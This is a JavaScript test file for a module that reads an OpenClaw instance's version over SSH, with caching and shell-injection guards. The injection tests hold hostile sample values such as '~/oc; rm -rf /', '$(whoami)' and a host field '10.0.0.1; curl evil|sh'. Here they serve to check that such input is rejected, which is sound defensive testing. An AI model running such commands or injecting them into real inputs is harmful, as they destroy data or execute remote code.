'use strict';

// Tests for #296 — reading an OpenClaw instance's version (its pinned image
// tag) from the instance .env over SSH, with caching + input validation.

const { describe, it, beforeEach, afterEach } = require('node:test');
const assert = require('node:assert/strict');
const { exec } = require('node:child_process');
const { promisify } = require('node:util');
const execAsync = promisify(exec);
const { setLevel } = require('../lib/logger');

setLevel('error');

const ocv = require('../lib/openclaw-version');

describe('openclaw-version (#296)', () => {
  describe('parseVersion', () => {
    it('extracts the tag from an OPENCLAW_IMAGE line', () => {
      assert.equal(
        ocv.parseVersion('OPENCLAW_IMAGE=ghcr.io/openclaw/openclaw:2026.5.28'),
        '2026.5.28'
      );
    });
    it('tolerates quotes, whitespace, and surrounding lines', () => {
      const env = 'FOO=bar\n  OPENCLAW_IMAGE = "ghcr.io/openclaw/openclaw:2026.5.6"\nBAZ=1';
      assert.equal(ocv.parseVersion(env), '2026.5.6');
    });
    it('returns null when absent or bad input', () => {
      assert.equal(ocv.parseVersion('NOPE=1'), null);
      assert.equal(ocv.parseVersion(''), null);
      assert.equal(ocv.parseVersion(null), null);
    });
    it('parses a bare/local image tag without a registry path (#308)', () => {
      // The real-world 'Volta' case: a locally-built image `openclaw:qmd`,
      // no `openclaw/openclaw` registry path. Pre-#308 this returned null.
      assert.equal(ocv.parseVersion('OPENCLAW_IMAGE=openclaw:qmd'), 'qmd');
      assert.equal(ocv.parseVersion('OPENCLAW_IMAGE=openclaw:latest'), 'latest');
    });
    it('parses non-openclaw / custom registry image names (#308)', () => {
      assert.equal(ocv.parseVersion('OPENCLAW_IMAGE=ghcr.io/openclaw/openclaw:2026.5.28'), '2026.5.28');
      assert.equal(ocv.parseVersion('OPENCLAW_IMAGE="myrepo/custom-claw:v1.2"'), 'v1.2');
    });
    it('does not mistake a registry host:port for a tag (#308)', () => {
      // The last colon precedes a `/`, so it's a host:port, not a tag → null.
      assert.equal(ocv.parseVersion('OPENCLAW_IMAGE=registry.local:5000/openclaw/openclaw'), null);
      // ...but a real tag after the port still parses.
      assert.equal(ocv.parseVersion('OPENCLAW_IMAGE=registry.local:5000/openclaw:edge'), 'edge');
    });
    it('returns null for an untagged image reference (#308)', () => {
      assert.equal(ocv.parseVersion('OPENCLAW_IMAGE=openclaw'), null);
    });
  });

  describe('isSafeInstanceDir', () => {
    it('accepts normal paths including a leading ~', () => {
      assert.equal(ocv.isSafeInstanceDir('~/openclaw-tilt'), true);
      assert.equal(ocv.isSafeInstanceDir('/opt/openclaw'), true);
      assert.equal(ocv.isSafeInstanceDir('openclaw'), true);
    });
    it('rejects shell metacharacters, spaces, and empty', () => {
      for (const bad of ['~/oc; rm -rf /', '$(whoami)', '`id`', 'a b', '', 'x|y', 'a&b', '"q"']) {
        assert.equal(ocv.isSafeInstanceDir(bad), false, `should reject: ${bad}`);
      }
    });
  });

  describe('fetchVersion', () => {
    const conn = (over = {}) => ({
      id: 'c1', host: 'h', sshUser: 'u', sshKeyPath: '~/.ssh/k', instanceDir: '~/openclaw', ...over
    });

    beforeEach(() => { ocv._cache.clear(); ocv._inflight.clear(); });
    afterEach(() => { ocv._internal.execAsync = execAsync; ocv._cache.clear(); ocv._inflight.clear(); });

    it('reads + parses the version over SSH and caches it', async () => {
      let calls = 0;
      ocv._internal.execAsync = async () => { calls++; return { stdout: 'OPENCLAW_IMAGE=ghcr.io/openclaw/openclaw:2026.5.28\n' }; };
      const r1 = await ocv.fetchVersion(conn());
      assert.equal(r1.version, '2026.5.28');
      assert.equal(r1.error, null);
      assert.equal(r1.cached, false);
      const r2 = await ocv.fetchVersion(conn());
      assert.equal(r2.version, '2026.5.28');
      assert.equal(r2.cached, true);
      assert.equal(calls, 1, 'second call served from cache (no second ssh)');
    });

    it('force bypasses the cache', async () => {
      let calls = 0;
      ocv._internal.execAsync = async () => { calls++; return { stdout: 'OPENCLAW_IMAGE=ghcr.io/openclaw/openclaw:2026.5.6' }; };
      await ocv.fetchVersion(conn());
      await ocv.fetchVersion(conn(), { force: true });
      assert.equal(calls, 2);
    });

    it('no instanceDir → error and no ssh attempted', async () => {
      let called = false;
      ocv._internal.execAsync = async () => { called = true; return { stdout: '' }; };
      const r = await ocv.fetchVersion(conn({ instanceDir: null }));
      assert.equal(r.version, null);
      assert.match(r.error, /no instanceDir/);
      assert.equal(called, false);
    });

    it('unsafe instanceDir → error and no ssh attempted (injection guard)', async () => {
      let called = false;
      ocv._internal.execAsync = async () => { called = true; return { stdout: '' }; };
      const r = await ocv.fetchVersion(conn({ instanceDir: '~/oc; rm -rf /' }));
      assert.equal(r.version, null);
      assert.match(r.error, /unsafe/);
      assert.equal(called, false);
    });

    it('unsafe host/sshUser/sshKeyPath → error and no ssh attempted (#314 injection guard)', async () => {
      let called = false;
      ocv._internal.execAsync = async () => { called = true; return { stdout: '' }; };
      for (const [field, bad, re] of [
        ['host', '10.0.0.1; curl evil|sh', /host/],
        ['sshUser', 'a$(whoami)', /sshUser/],
        ['sshKeyPath', '~/.ssh/k`id`', /sshKeyPath/]
      ]) {
        const r = await ocv.fetchVersion(conn({ [field]: bad }));
        assert.equal(r.version, null, `${field} should block`);
        assert.match(r.error, re);
      }
      assert.equal(called, false, 'no ssh runs for an unsafe-shaped target');
    });

    it('ssh failure → surfaces an error, no crash', async () => {
      ocv._internal.execAsync = async () => { const e = new Error('boom'); e.stderr = 'conn refused'; throw e; };
      const r = await ocv.fetchVersion(conn());
      assert.equal(r.version, null);
      assert.match(r.error, /ssh read failed/);
    });

    it('image line missing in .env → version null with a reason', async () => {
      ocv._internal.execAsync = async () => ({ stdout: 'SOMETHING=else\n' });
      const r = await ocv.fetchVersion(conn());
      assert.equal(r.version, null);
      assert.match(r.error, /not found/);
    });

    it('does not block the event loop while ssh is pending (hard-reboot hang)', async () => {
      // An unreachable host used to hold execSync for the whole connect
      // timeout, freezing every WebSocket. A timer must fire mid-read.
      let release;
      ocv._internal.execAsync = () => new Promise((resolve) => { release = resolve; });
      const pending = ocv.fetchVersion(conn());
      assert.ok(pending instanceof Promise, 'fetchVersion returns a promise');
      let timerFired = false;
      await new Promise((resolve) => setTimeout(() => { timerFired = true; resolve(); }, 5));
      assert.equal(timerFired, true);
      release({ stdout: 'OPENCLAW_IMAGE=openclaw:edge' });
      assert.equal((await pending).version, 'edge');
    });

    it('concurrent callers share one ssh read', async () => {
      let calls = 0;
      const releases = [];
      ocv._internal.execAsync = () => { calls++; return new Promise((resolve) => { releases.push(resolve); }); };
      const a = ocv.fetchVersion(conn());
      const b = ocv.fetchVersion(conn());
      const c = ocv.fetchVersion(conn(), { force: true });
      for (const release of releases) release({ stdout: 'OPENCLAW_IMAGE=openclaw:qmd' });
      const results = await Promise.all([a, b, c]);
      assert.equal(calls, 1, 'one ssh for three concurrent callers');
      for (const r of results) assert.equal(r.version, 'qmd');
      assert.equal(ocv._inflight.size, 0, 'in-flight entry cleared once settled');
    });

    it('a failed read is not cached, so the next call retries', async () => {
      let calls = 0;
      ocv._internal.execAsync = async () => { calls++; throw Object.assign(new Error('timeout'), { stderr: '' }); };
      await ocv.fetchVersion(conn());
      await ocv.fetchVersion(conn());
      assert.equal(calls, 2);
      assert.equal(ocv._cache.size, 0);
    });

    it('a read in flight when the connection is invalidated is not cached', async () => {
      let calls = 0;
      const releases = [];
      ocv._internal.execAsync = () => { calls++; return new Promise((resolve) => { releases.push(resolve); }); };
      const stale = ocv.fetchVersion(conn());
      ocv.invalidate('c1'); // connection edited mid-read
      const fresh = ocv.fetchVersion(conn({ instanceDir: '~/openclaw-new' }));
      assert.equal(calls, 2, 'a read after invalidate does not join the stale one');
      releases[0]({ stdout: 'OPENCLAW_IMAGE=openclaw:old' });
      releases[1]({ stdout: 'OPENCLAW_IMAGE=openclaw:new' });
      assert.equal((await stale).version, 'old');
      assert.equal((await fresh).version, 'new');
      assert.equal(ocv._cache.get('c1').version, 'new', 'only the post-invalidate read is cached');
      assert.equal(ocv._inflight.size, 0);
    });
  });
});
